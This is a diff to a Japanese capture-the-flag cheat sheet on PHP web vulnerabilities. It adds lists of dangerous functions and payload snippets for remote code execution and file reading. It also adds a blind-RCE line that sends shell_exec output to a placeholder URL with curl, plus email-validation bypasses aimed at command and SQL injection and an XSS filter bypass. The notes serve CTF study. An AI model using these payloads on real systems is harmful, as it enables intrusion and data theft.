@@ -12,8 +12,6 @@
       - [PHP XXE Injection](#php-xxe-injection)
       - [PHP Type Juggling](#php-type-juggling)
       - [PHP XSS](#php-xss)
-      - [PHP XXE](#php-xxe)
-      - [PHP Directory Traversal](#php-directory-traversal)
       - [その他](#%E3%81%9D%E3%81%AE%E4%BB%96)
     - [Command Injection](#command-injection)
 - [Vuln](#vuln)
@@ -58,13 +56,22 @@ PHAR形式のファイルをアップロードできてその場所が特定で�
 #### PHP XXE Injection
 変数名`xml`,`loadXML`,`simplexml_load_string`,`svg`
 #### PHP Type Juggling
-`==`,`!=`,`eval`  
+`==`,`!=`,`eval`,`strcasecmp`,`strcmp`  
 #### PHP XSS
-`$_SERVER['PHP_SELF']`  
+`$_SERVER['PHP_SELF']`,`preg_replace`  
 #### PHP XXE
-`file_get_contents`,`loadXML`  
+`file_get_contents`,`loadXML`,`simplexml_load_string`  
 #### PHP Directory Traversal
 `file_get_contetns`(外部のURLも可)  
+#### PHP Command Injection
+`backtick演算子`(バッククォート),`shell_exec`,`exec`,`passthru`,`system`,`pcntl_exec`,`popen`,`proc_open`,`eval`  
+`preg_replace`  
+以下でいろいろRCEできるときにPHPでいろいろできる。  
+- **RCE** `system("ls -la ./");`, `<?='cat /flag';`  
+- **ls** `foreach(new DirectoryIterator('glob:///*') as $f){ echo $f."\n"; }`,`print_r(scandir('./'));`,`var_dump(scandir("/var/www/html"));`  
+- **cat** `readfile(glob('*')[0]);`,`eval(system('cat /flag'));`,`show_source('./flag.txt');`,`var_dump(base64_encode(readfile("../../../flag.so")));`  
+- 定義済み配列をすべて出す `print_r(get_defined_vars())`  
+- blind RCE `$output=shell_exec(\"ls\");shell_exec(\"curl -XPOST -d'data=$output' [url]"\");`  
 #### その他
 https://www.hamayanhamayan.com/entry/2020/08/09/193357  
 - `ob_start()`  
@@ -81,7 +88,12 @@ https://ndb796.tistory.com/332
 - `opcache`  
 https://www.sousse.love/post/carthagods-3kctf2020/index.html  
 phpinfoが見れて、`opcache.file_cache = /var/www/cache/`となってopchacheがセットされていれば、webroot上に存在する`flag.php`には`/var/www/cache/[system_id]/var/www/html/flag.php.bin`でアクセスできる。このsystem idは`python ./system_id_scraper.py http://carthagods.3k.ctf.to:8039/info.php`みたいにしてこのスクリプトを使って特定できるらしい？？  
-
+- `filter_var($address, FILTER_VALIDATE_EMAIL);`  
+https://github.com/w181496/Web-CTF-Cheatsheet#mysql  
+`filter_var('aaa."bbb"@b.c',FILTER_VALIDATE_EMAIL)`とかで`aaa."bbb"@b.c`を通すことができる。`aaa."bbb@b.c`なら通さないのに…  
+`"'whoami'"@example.com`とかでCommand Injectionにつながるかも。`'||1#@i.i`も通すのでSQL Injectionできるかも。  
+- `preg_replace`  
+１回しかreplaceしないので`scrscriptipt`とかは`script`になってこれは通す。  
 ### Command Injection
 `system`,`exec`,`create_function`
 # Vuln
